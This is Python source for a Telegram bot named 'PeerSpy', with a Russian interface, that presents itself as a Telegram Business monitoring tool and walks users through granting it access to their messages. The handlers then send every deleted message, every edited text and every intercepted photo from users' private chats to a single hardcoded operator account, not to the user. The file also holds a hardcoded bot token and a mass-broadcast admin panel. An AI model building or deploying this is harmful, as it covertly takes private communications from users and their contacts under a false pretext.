import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- НАСТРОЙКИ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, user_id TEXT, text TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

# --- ВЕБ-СЕРВЕР ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy System: ONLINE"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- БОТ ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

# --- КНОПКИ ---
def get_main_kb(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🛠 Как подключить?", callback_data="how_to"))
    builder.row(types.InlineKeyboardButton(text="📊 Мой профиль", callback_data="my_profile"))
    if user_id == ADMIN_ID:
        builder.row(types.InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_main"))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Сохраняем юзера
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (message.from_user.id, message.from_user.username, str(datetime.now())))
    conn.commit()
    conn.close()
    
    welcome_text = (
        f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
        "Добро пожаловать в <b>PeerSpy</b> — профессиональный инструмент мониторинга Telegram Business.\n\n"
        "🛡 <b>Что я умею:</b>\n"
        "├ Сохраняю исчезающие фото\n"
        "├ Ловлю удаленные сообщения\n"
        "└ Фиксирую изменения текста\n\n"
        "<i>Нажми кнопку ниже, чтобы начать настройку:</i>"
    )
    await message.answer(welcome_text, reply_markup=get_main_kb(message.from_user.id))

# ОБРАБОТЧИК БИЗНЕС-СООБЩЕНИЙ
@dp.business_message()
async def biz_msg(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    txt = message.text or message.caption or "[Медиа]"
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
    conn.commit()
    conn.close()

    # Перехват фото по реплаю
    if message.reply_to_message and message.reply_to_message.photo:
        f_id = message.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                res = await r.json()
                if res.get("ok"):
                    path = res["result"]["file_path"]
                    async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                        photo = types.BufferedInputFile(await fr.read(), filename="spy_photo.jpg")
                        await bot.send_photo(ADMIN_ID, photo, caption="📸 <b>Фото перехвачено!</b>")

# УДАЛЕНИЯ И ПРАВКИ (универсальный синтаксис)
@dp.business_edited_message()
async def biz_edit(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
    old = cur.fetchone()
    if old:
        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменение в чате:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {message.text}")
    conn.close()

@dp.business_deleted_messages()
async def biz_delete(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено сообщение:</b>\n\n<code>{res[0]}</code>")
    conn.close()

# --- CALLBACKS ---
@dp.callback_query(F.data == "how_to")
async def cb_help(c: types.CallbackQuery):
    text = (
        "<b>🚀 Как подключить мониторинг:</b>\n\n"
        "1. Зайди в <b>Настройки</b> -> <b>Telegram Business</b>.\n"
        "2. Выбери пункт <b>Чат-боты</b>.\n"
        "3. Нажми <b>Подключить бота</b> и выбери меня.\n"
        "4. Обязательно разреши <b>'Доступ к сообщениям'</b>.\n\n"
        "✅ После этого я начну присылать отчеты сюда!"
    )
    await c.message.answer(text)
    await c.answer()

@dp.callback_query(F.data == "admin_main")
async def cb_admin(c: types.CallbackQuery):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="start_bc"))
    await c.message.answer(f"<b>⚙️ Админ-панель</b>\n\nВсего пользователей: <b>{count}</b>", reply_markup=b.as_markup())
    await c.answer()

@dp.callback_query(F.data == "start_bc")
async def bc_init(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("Введите текст сообщения для всех пользователей:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def bc_send(m: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
    for u in users:
        try: await bot.send_message(u[0], m.text)
        except: pass
    await m.answer("✅ Рассылка завершена!"); await state.clear()

async def main():
    init_db()
    Thread(target=run_web).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
